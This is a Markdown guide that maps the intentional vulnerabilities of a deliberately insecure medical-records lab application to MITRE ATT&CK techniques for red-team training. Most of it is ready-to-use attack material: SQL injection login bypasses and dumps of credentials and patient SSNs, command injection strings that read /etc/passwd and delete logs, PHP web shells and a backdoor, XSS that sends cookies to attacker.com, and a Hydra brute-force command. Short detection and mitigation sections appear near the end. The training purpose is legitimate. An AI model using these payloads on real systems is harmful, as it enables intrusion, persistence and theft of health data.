# MITRE ATT&CK Framework Mapping
## MedCare EHR Vulnerable Web Application

This document maps the intentional vulnerabilities in the MedCare EHR application to MITRE ATT&CK techniques, providing a comprehensive framework for security testing and red team exercises.

---

## 📊 Overview

The MedCare EHR application enables testing of **32 MITRE ATT&CK techniques** across **8 tactics**:

- **Initial Access**: 3 techniques
- **Execution**: 4 techniques  
- **Persistence**: 3 techniques
- **Privilege Escalation**: 4 techniques
- **Defense Evasion**: 4 techniques
- **Credential Access**: 5 techniques
- **Discovery**: 5 techniques
- **Collection**: 4 techniques

---

## 🎯 MITRE ATT&CK Techniques by Tactic

### 1. Initial Access

#### T1190: Exploit Public-Facing Application

**Description**: Adversaries may attempt to exploit weaknesses in Internet-facing applications.

**Vulnerable Component**: Multiple (SQL Injection, Command Injection, File Upload)

**Attack Vector**:
```
SQL Injection at login:
Username: admin' OR '1'='1' -- 
Password: anything
```

**Testing Steps**:
1. Navigate to `http://localhost:8080`
2. Enter SQL injection payload in username field
3. Bypass authentication
4. Gain unauthorized access

**Detection**: 
- Monitor for SQL error messages in logs
- Detect unusual login patterns
- Check for authentication bypasses

---

#### T1133: External Remote Services

**Description**: Adversaries may leverage external-facing remote services.

**Vulnerable Component**: Web application exposed on port 8080

**Attack Vector**:
- Direct HTTP access to vulnerable endpoints
- No VPN or additional authentication required

**Testing Steps**:
1. Access application from external network
2. Enumerate endpoints via `api.php`
3. Test unauthenticated access to `search.php`

---

#### T1566.002: Phishing - Spearphishing Link

**Description**: Send link to malicious web page to obtain credentials.

**Vulnerable Component**: XSS vulnerability allows credential harvesting

**Attack Vector**:
```javascript
<script>
window.location='http://attacker.com/fake-login?redirect=' + document.location;
</script>
```

**Testing Steps**:
1. Inject XSS payload into medical notes (patient #20)
2. Send link to victim user
3. Capture credentials when victim logs in

---

### 2. Execution

#### T1059.004: Command and Scripting Interpreter - Unix Shell

**Description**: Execute commands via shell interpreter.

**Vulnerable Component**: `settings.php` - Network Diagnostics feature

**Attack Vector**:
```
http://localhost:8080/settings.php?ping=localhost;whoami
http://localhost:8080/settings.php?ping=localhost;cat+/etc/passwd
```

**Testing Steps**:
1. Login with valid credentials
2. Navigate to Settings → Network Diagnostics
3. Enter: `localhost; id`
4. Execute arbitrary commands

**Proof of Concept**:
```bash
curl "http://localhost:8080/settings.php?ping=localhost;uname+-a" \
  -b "PHPSESSID=session_id"
```

---

#### T1059.007: Command and Scripting Interpreter - JavaScript

**Description**: Execute JavaScript code in victim's browser.

**Vulnerable Component**: XSS in medical notes field

**Attack Vector**:
```html
<script>alert(document.cookie)</script>
```

**Testing Steps**:
1. Access patient record with XSS payload (patient #20)
2. JavaScript executes in victim browser
3. Can be used for session hijacking, keylogging, etc.

---

#### T1203: Exploitation for Client Execution

**Description**: Exploit software vulnerabilities to execute code.

**Vulnerable Component**: File upload allows PHP execution

**Attack Vector**:
Upload malicious PHP file:
```php
<?php system($_GET['cmd']); ?>
```

Access at:
```
http://localhost:8080/uploads/shell.php?cmd=whoami
```

**Testing Steps**:
1. Login to application
2. Navigate to Upload Files
3. Upload `shell.php`
4. Access uploaded file with `?cmd=` parameter
5. Execute arbitrary system commands

---

#### T1204.002: User Execution - Malicious File

**Description**: User executes malicious file.

**Vulnerable Component**: Unrestricted file upload

**Attack Vector**:
- Upload reverse shell
- Upload web shell
- Upload malicious script

**Testing Steps**:
1. Create malicious PHP reverse shell
2. Upload via `upload.php`
3. Access uploaded file to trigger execution

---

### 3. Persistence

#### T1136.001: Create Account - Local Account

**Description**: Create local account to maintain access.

**Vulnerable Component**: `register.php` with role parameter tampering

**Attack Vector**:
```http
POST /register.php
username=backdoor&password=hidden123&email=backdoor@evil.com&role=admin
```

**Testing Steps**:
1. Navigate to registration page
2. Intercept request with Burp Suite
3. Add `role=admin` parameter
4. Create admin account for persistence

**SQL Injection Method**:
```sql
'; INSERT INTO users (username, password, role) VALUES ('backdoor', 'hidden', 'admin') -- 
```

---

#### T1505.003: Server Software Component - Web Shell

**Description**: Install web shell for persistent access.

**Vulnerable Component**: File upload with PHP execution

**Attack Vector**:
Upload `backdoor.php`:
```php
<?php
if(md5($_GET['key']) == '5f4dcc3b5aa765d61d8327deb882cf99') {
    system($_GET['cmd']);
}
?>
```

**Testing Steps**:
1. Upload web shell with authentication
2. Access: `uploads/backdoor.php?key=password&cmd=id`
3. Maintains access even if primary account is removed

---

#### T1098: Account Manipulation

**Description**: Modify account to maintain access or escalate privileges.

**Vulnerable Component**: SQL injection allows direct database modification

**Attack Vector**:
```sql
'; UPDATE users SET password='hacked' WHERE username='admin' -- 
'; UPDATE users SET role='admin' WHERE username='attacker' -- 
```

**Testing Steps**:
1. Use SQL injection vulnerability
2. Update user account privileges
3. Change passwords of existing accounts

---

### 4. Privilege Escalation

#### T1068: Exploitation for Privilege Escalation

**Description**: Exploit vulnerabilities to gain elevated privileges.

**Vulnerable Component**: Registration with admin role assignment

**Attack Vector**:
Register with admin role via parameter manipulation

**Testing Steps**:
1. Intercept registration request
2. Set `role=admin`
3. Create account with elevated privileges

---

#### T1078.003: Valid Accounts - Local Accounts

**Description**: Obtain credentials of existing accounts.

**Vulnerable Component**: Plain text password storage + SQL injection

**Attack Vector**:
Extract all passwords via SQL injection:
```sql
' UNION SELECT id,username,password,email,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM users -- 
```

**Testing Steps**:
1. Use SQL injection in search field
2. Extract username and password pairs
3. Login as admin or doctor
4. Gain elevated privileges

---

#### T1548.002: Abuse Elevation Control Mechanism - Bypass UAC

**Description**: Bypass access controls through application logic flaws.

**Vulnerable Component**: IDOR vulnerability

**Attack Vector**:
```
http://localhost:8080/dashboard.php?patient_id=1
```

**Testing Steps**:
1. Login as low-privilege user (patient)
2. Access admin functions via direct URL manipulation
3. Bypass role-based access controls

---

#### T1055: Process Injection

**Description**: Inject code into processes.

**Vulnerable Component**: Command injection vulnerability

**Attack Vector**:
```bash
http://localhost:8080/settings.php?ping=localhost;python3+-c+'import+socket...'
```

**Testing Steps**:
1. Use command injection to inject Python reverse shell
2. Spawn shell in context of web server process
3. Gain code execution as www-data user

---

### 5. Defense Evasion

#### T1027: Obfuscated Files or Information

**Description**: Make file or information difficult to discover or analyze.

**Vulnerable Component**: File upload accepts any extension

**Attack Vector**:
- Upload `shell.php.jpg` (double extension)
- Upload `image.jpg` containing PHP code
- Base64 encode payloads

**Testing Steps**:
1. Create obfuscated web shell
2. Upload with misleading extension
3. Access via direct URL

---

#### T1070.004: Indicator Removal - File Deletion

**Description**: Delete files to remove evidence.

**Vulnerable Component**: Command injection allows file deletion

**Attack Vector**:
```bash
http://localhost:8080/settings.php?ping=localhost;rm+/var/log/apache2/access.log
```

**Testing Steps**:
1. Execute commands via command injection
2. Delete log files
3. Remove uploaded web shells
4. Clear audit trails

---

#### T1562.001: Impair Defenses - Disable or Modify Tools

**Description**: Prevent security tools from operating.

**Vulnerable Component**: Command execution + elevated privileges

**Attack Vector**:
```bash
# Disable logging
;echo '' > /var/log/apache2/access.log

# Modify security configs
;sed -i 's/display_errors = Off/display_errors = On/' /usr/local/etc/php/php.ini
```

**Testing Steps**:
1. Use command injection
2. Modify security configurations
3. Disable logging mechanisms

---

#### T1140: Deobfuscate/Decode Files or Information

**Description**: Reverse obfuscation to reveal payload.

**Vulnerable Component**: File viewer can read encoded files

**Attack Vector**:
```
http://localhost:8080/settings.php?file=.env.example
```

**Testing Steps**:
1. Upload base64-encoded payload
2. Use file viewer to read and decode
3. Execute decoded content

---

### 6. Credential Access

#### T1110.001: Brute Force - Password Guessing

**Description**: Guess passwords to gain access.

**Vulnerable Component**: No account lockout, weak passwords

**Attack Vector**:
```bash
hydra -l admin -P passwords.txt localhost -s 8080 \
  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid"
```

**Testing Steps**:
1. Enumerate usernames (via SQL injection or error messages)
2. Use Hydra or custom script
3. Brute force with common passwords
4. Successful login with `admin:admin123`

---

#### T1110.003: Brute Force - Password Spraying

**Description**: Try common passwords across many accounts.

**Vulnerable Component**: No rate limiting or account lockout

**Attack Vector**:
```python
users = ['admin', 'doctor1', 'nurse1', 'patient1']
passwords = ['password', 'admin123', 'Password123!']
for user in users:
    for pwd in passwords:
        login(user, pwd)
```

**Testing Steps**:
1. Obtain list of usernames
2. Try common passwords across all accounts
3. Identify accounts with weak passwords

---

#### T1003.002: Credential Dumping - Security Account Manager

**Description**: Dump credentials from database.

**Vulnerable Component**: SQL injection + plain text passwords

**Attack Vector**:
```sql
' UNION SELECT username, password, email, role, 5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM users -- 
```

**Testing Steps**:
1. Use SQL injection to extract users table
2. Obtain all usernames and passwords
3. No cracking needed - passwords stored in plain text

**Expected Output**:
```
admin:admin123
doctor1:doctor123  
nurse1:nurse123
```

---

#### T1555.003: Credentials from Password Stores

**Description**: Extract credentials from configuration files.

**Vulnerable Component**: Directory traversal vulnerability

**Attack Vector**:
```
http://localhost:8080/settings.php?file=.env.example
```

**Testing Steps**:
1. Access settings page
2. Use file viewer to read `.env.example`
3. Extract database credentials, API keys, AWS credentials

**Exposed Credentials**:
```
DB_USER=webapp
DB_PASS=webapp123
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

---

#### T1539: Steal Web Session Cookie

**Description**: Steal session cookies to bypass authentication.

**Vulnerable Component**: XSS vulnerability

**Attack Vector**:
```javascript
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Testing Steps**:
1. Inject XSS payload into patient medical notes
2. Wait for admin to view patient record
3. Capture admin's PHPSESSID cookie
4. Use cookie to hijack admin session

**Session Hijacking**:
```bash
curl http://localhost:8080/dashboard.php \
  -b "PHPSESSID=stolen_session_id"
```

---

### 7. Discovery

#### T1087.001: Account Discovery - Local Account

**Description**: Enumerate local accounts.

**Vulnerable Component**: SQL injection + information disclosure

**Attack Vector**:
```sql
' UNION SELECT id,username,email,role,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM users -- 
```

**Testing Steps**:
1. Use SQL injection to list all users
2. Identify usernames, roles, email addresses
3. Map organizational structure

**Alternative**:
```
http://localhost:8080/settings.php (displays current user info)
```

---

#### T1046: Network Service Discovery

**Description**: Discover services running on remote hosts.

**Vulnerable Component**: Command injection + network tools

**Attack Vector**:
```bash
http://localhost:8080/settings.php?ping=localhost;nmap+-sV+internal-network
http://localhost:8080/settings.php?ping=localhost;netstat+-an
```

**Testing Steps**:
1. Use command injection
2. Run network scanning tools
3. Discover other services and systems

---

#### T1082: System Information Discovery

**Description**: Gather information about the system.

**Vulnerable Component**: `settings.php` system information panel + phpinfo

**Attack Vector**:
```
http://localhost:8080/settings.php
http://localhost:8080/settings.php?phpinfo=1
http://localhost:8080/index.php?info=1
```

**Information Disclosed**:
- PHP version
- Server software
- Operating system
- Document root
- Server IP address
- Environment variables
- Loaded PHP modules

**Testing Steps**:
1. Access settings page
2. View system information section
3. Access phpinfo() page
4. Gather reconnaissance data

---

#### T1083: File and Directory Discovery

**Description**: Enumerate files and directories.

**Vulnerable Component**: Directory traversal vulnerability

**Attack Vector**:
```
http://localhost:8080/settings.php?file=/etc/passwd
http://localhost:8080/settings.php?file=/var/www/html/
http://localhost:8080/settings.php?file=index.php
```

**Testing Steps**:
1. Use file viewer to read directory listings
2. Enumerate configuration files
3. Locate sensitive data
4. Map application structure

---

#### T1016: System Network Configuration Discovery

**Description**: Look for network configuration information.

**Vulnerable Component**: Command injection

**Attack Vector**:
```bash
http://localhost:8080/settings.php?ping=localhost;ifconfig
http://localhost:8080/settings.php?ping=localhost;cat+/etc/resolv.conf
http://localhost:8080/settings.php?ping=localhost;route+-n
```

**Testing Steps**:
1. Execute network commands via command injection
2. Discover IP addresses, subnets, DNS servers
3. Map network topology

---

### 8. Collection

#### T1005: Data from Local System

**Description**: Search local system for sensitive data.

**Vulnerable Component**: Directory traversal + file viewer

**Attack Vector**:
```
http://localhost:8080/settings.php?file=/var/www/html/uploads/upload_log.txt
http://localhost:8080/settings.php?file=/var/log/apache2/access.log
```

**Testing Steps**:
1. Use file viewer to access logs
2. Read uploaded files
3. Extract sensitive information

---

#### T1530: Data from Cloud Storage

**Description**: Access data in cloud storage.

**Vulnerable Component**: AWS credentials in `.env.example`

**Attack Vector**:
1. Read `.env.example` via directory traversal
2. Extract AWS credentials
3. Access S3 bucket: `medcare-patient-documents`

**Testing Steps**:
```bash
# Extract credentials from .env
curl "http://localhost:8080/settings.php?file=.env.example"

# Use AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws s3 ls s3://medcare-patient-documents
```

---

#### T1213.002: Data from Information Repositories - Sharepoint

**Description**: Collect data from corporate repositories.

**Vulnerable Component**: Database access via SQL injection

**Attack Vector**:
```sql
' UNION SELECT id,first_name,last_name,ssn,date_of_birth,phone,email,address,insurance_policy_number,10,11,12,13,14,15,16,17,18,19,20 FROM patients -- 
```

**Testing Steps**:
1. Use SQL injection to extract patient database
2. Collect all PHI/PII
3. Export to CSV via reports.php

---

#### T1114: Email Collection

**Description**: Access email data.

**Vulnerable Component**: SMTP credentials in configuration

**Attack Vector**:
```
http://localhost:8080/settings.php?file=.env.example
```

Extract:
```
SMTP_USER=noreply@medcare.local
SMTP_PASS=smtp_password_123
```

**Testing Steps**:
1. Read configuration file
2. Extract SMTP credentials
3. Access email server
4. Collect sent/received emails

---

## 🎯 Attack Chain Examples

### Full Kill Chain: Initial Access → Impact

```
1. Initial Access (T1190)
   ↓ SQL Injection at login
   
2. Execution (T1059.004)
   ↓ Command injection via settings.php
   
3. Persistence (T1505.003)
   ↓ Upload web shell
   
4. Privilege Escalation (T1078.003)
   ↓ Extract admin credentials via SQL injection
   
5. Defense Evasion (T1070.004)
   ↓ Delete access logs
   
6. Credential Access (T1555.003)
   ↓ Extract credentials from .env
   
7. Discovery (T1082)
   ↓ Enumerate system and network
   
8. Collection (T1213.002)
   ↓ Export patient database
   
9. Exfiltration (not detailed above)
   ↓ Transfer data to external server
```

---

## 📊 Techniques by Vulnerability

| Vulnerability | MITRE Techniques |
|--------------|------------------|
| SQL Injection | T1190, T1110.003, T1003.002, T1087.001, T1213.002 |
| Command Injection | T1059.004, T1046, T1016, T1070.004, T1562.001 |
| File Upload | T1203, T1204.002, T1505.003, T1027 |
| XSS | T1059.007, T1539, T1566.002 |
| IDOR | T1548.002 |
| Directory Traversal | T1005, T1555.003, T1083 |
| Weak Authentication | T1110.001, T1078.003 |
| Information Disclosure | T1082, T1087.001 |
| Mass Assignment | T1136.001, T1098, T1068 |

---

## 🛡️ Detection and Mitigation

### Detection Strategies

**For SQL Injection**:
- Monitor for SQL errors in application logs
- Detect unusual database queries
- Alert on UNION, SELECT, DROP keywords in inputs

**For Command Injection**:
- Monitor process execution from web server
- Detect shell metacharacters in inputs (`;`, `|`, `&`)
- Alert on unexpected child processes

**For File Upload Attacks**:
- Monitor uploads directory for PHP/executable files
- Detect access to recently uploaded files
- Alert on unusual file extensions

**For XSS**:
- Implement Content Security Policy (CSP)
- Monitor for `<script>` tags in database
- Detect unusual JavaScript execution

### Mitigation Strategies

**Secure Coding Practices**:
- Use prepared statements (parameterized queries)
- Implement input validation and output encoding
- Use secure file upload mechanisms
- Implement proper access controls
- Hash passwords with bcrypt/argon2
- Enable CSRF protection
- Use HTTPS for all traffic
- Implement rate limiting

**Security Controls**:
- Web Application Firewall (WAF)
- Intrusion Detection System (IDS)
- Database activity monitoring
- File integrity monitoring
- Log aggregation and analysis

---

## 📈 Metrics and Reporting

### Red Team Success Metrics:
- Number of techniques successfully executed
- Time to initial access
- Time to privilege escalation
- Amount of sensitive data exfiltrated
- Persistence mechanisms established

### Blue Team Detection Metrics:
- Detection rate for each technique
- Time to detect compromise
- False positive rate
- Mean time to respond (MTTR)

---

## 🔍 Advanced Testing Scenarios

### Scenario 1: APT Simulation
1. **Initial Reconnaissance** (T1082, T1087)
2. **Exploitation** (T1190 - SQL Injection)
3. **Establish Foothold** (T1505.003 - Web Shell)
4. **Credential Harvesting** (T1003.002, T1555.003)
5. **Lateral Movement** (using extracted DB credentials)
6. **Data Exfiltration** (T1213.002)
7. **Maintain Access** (T1098, T1136)

### Scenario 2: Insider Threat
1. **Login with valid credentials** (T1078.003)
2. **Privilege Escalation** (T1068 - Role manipulation)
3. **Data Collection** (T1213.002 - Export all patients)
4. **Defense Evasion** (T1070.004 - Clear logs)

### Scenario 3: Ransomware Preparation
1. **Initial Access** (T1190)
2. **Execution** (T1059.004 - Command injection)
3. **Discovery** (T1082, T1083, T1046)
4. **Collection** (T1005 - Enumerate valuable data)
5. **Persistence** (T1505.003, T1136.001)
6. (Encryption and ransom note - not implemented)

---

## 📚 References

### MITRE ATT&CK
- [Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [Technique Descriptions](https://attack.mitre.org/techniques/enterprise/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)

### Healthcare Security
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/)
- [Healthcare Threat Landscape](https://www.hhs.gov/sites/default/files/health-industry-cybersecurity-practices.pdf)

### Vulnerability Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)

---

## 🎓 Training Exercises

### Exercise 1: SQL Injection
- Objective: Extract all user credentials
- Techniques: T1190, T1003.002
- Time: 15 minutes

### Exercise 2: Web Shell Deployment
- Objective: Establish persistent access
- Techniques: T1204.002, T1505.003
- Time: 20 minutes

### Exercise 3: Full Compromise
- Objective: Go from unauthenticated to admin with data exfiltration
- Techniques: Multiple across all tactics
- Time: 60 minutes

---

## ✅ Testing Checklist

- [ ] T1190 - Exploit public-facing application (SQL Injection)
- [ ] T1059.004 - Unix shell command execution
- [ ] T1059.007 - JavaScript execution (XSS)
- [ ] T1203 - File upload exploitation
- [ ] T1505.003 - Web shell installation
- [ ] T1136.001 - Create admin account
- [ ] T1098 - Modify account privileges
- [ ] T1068 - Privilege escalation via registration
- [ ] T1078.003 - Use stolen valid credentials
- [ ] T1027 - Upload obfuscated files
- [ ] T1070.004 - Delete log files
- [ ] T1110.001 - Password brute force
- [ ] T1003.002 - Dump credentials from database
- [ ] T1555.003 - Extract credentials from config files
- [ ] T1539 - Steal session cookies via XSS
- [ ] T1087.001 - Enumerate user accounts
- [ ] T1046 - Network service discovery
- [ ] T1082 - System information disclosure
- [ ] T1083 - File and directory discovery
- [ ] T1016 - Network configuration discovery
- [ ] T1005 - Access local files
- [ ] T1213.002 - Export patient database

---

## 🏆 Success Criteria

**Beginner Level**:
- Successfully execute 5+ techniques
- Gain authenticated access
- Extract some patient data

**Intermediate Level**:
- Successfully execute 10+ techniques
- Achieve privilege escalation
- Establish persistence
- Extract credentials

**Advanced Level**:
- Successfully execute 15+ techniques
- Complete full attack chain
- Exfiltrate complete database
- Maintain undetected access
- Demonstrate lateral movement

---

## 📝 Reporting Template

### Technique Execution Report

**Technique ID**: T1XXX
**Technique Name**: [Name]
**Tactic**: [Tactic]
**Vulnerability**: [Component]
**Payload Used**: [Payload]
**Result**: Success/Failure
**Evidence**: [Screenshot/Log]
**Remediation**: [Fix recommendation]

---

**Document Version**: 1.0
**Last Updated**: October 28, 2024
**Maintainer**: Project Medusa Team

